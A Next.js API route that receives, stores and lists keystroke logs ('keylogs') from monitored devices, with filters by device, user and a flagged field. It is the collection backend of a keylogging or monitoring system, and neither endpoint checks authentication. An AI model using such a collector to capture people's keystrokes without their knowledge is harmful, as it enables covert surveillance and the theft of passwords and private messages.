import { NextResponse } from "next/server";
import prisma from "@/lib/prisma";

export async function GET(request: Request) {
  try {
    const url = new URL(request.url);
    const device = url.searchParams.get("device");
    const user = url.searchParams.get("user");
    const flagged = url.searchParams.get("flagged");
    const limit = url.searchParams.get("limit")
      ? Number.parseInt(url.searchParams.get("limit")!)
      : undefined;

    // Build the filter object for Prisma
    const filter: any = {};

    if (device) {
      filter.device = {
        name: {
          contains: device,
          mode: "insensitive",
        },
      };
    }

    if (user) {
      filter.user = {
        name: {
          contains: user,
          mode: "insensitive",
        },
      };
    }

    if (flagged) {
      filter.flagged = flagged === "true";
    }

    // Fetch keylogs from database with filters
    const keylogs = await prisma.keylog.findMany({
      where: filter,
      include: {
        device: {
          select: {
            name: true,
          },
        },
        user: {
          select: {
            name: true,
          },
        },
      },
      orderBy: {
        timestamp: "desc",
      },
      take: limit,
    });

    // Format the response
    const formattedKeylogs = keylogs.map((keylog) => ({
      id: keylog.id,
      device: keylog.device?.name || "Unknown Device",
      user: keylog.user?.name || "Unknown User",
      timestamp: keylog.timestamp,
      type: keylog.type,
      content: keylog.content,
      flagged: keylog.flagged,
    }));

    return NextResponse.json({ keylogs: formattedKeylogs });
  } catch (error) {
    console.error("Error fetching keylogs:", error);
    return NextResponse.json(
      { success: false, message: "Failed to fetch keylogs" },
      { status: 500 },
    );
  }
}

export async function POST(request: Request) {
  try {
    const keylogData = await request.json();

    // Validate required fields
    if (!keylogData.deviceId || !keylogData.type || !keylogData.content) {
      return NextResponse.json(
        {
          success: false,
          message:
            "Missing required fields: deviceId, type, and content are required",
        },
        { status: 400 },
      );
    }

    // Check if device exists
    const device = await prisma.device.findUnique({
      where: { id: keylogData.deviceId },
    });

    if (!device) {
      return NextResponse.json(
        { success: false, message: "Device not found" },
        { status: 404 },
      );
    }

    // Create the keylog entry
    const newKeylog = await prisma.keylog.create({
      data: {
        type: keylogData.type,
        content: keylogData.content,
        flagged: keylogData.flagged || false,
        timestamp: keylogData.timestamp
          ? new Date(keylogData.timestamp)
          : new Date(),
        deviceId: keylogData.deviceId,
        userId: keylogData.userId || device.userId, // Use device's user if not specified
      },
    });

    return NextResponse.json({
      success: true,
      message: "Keylog data received successfully",
      keylog: newKeylog,
    });
  } catch (error) {
    console.error("Error processing keylog data:", error);
    return NextResponse.json(
      { success: false, message: "Failed to process keylog data" },
      { status: 500 },
    );
  }
}
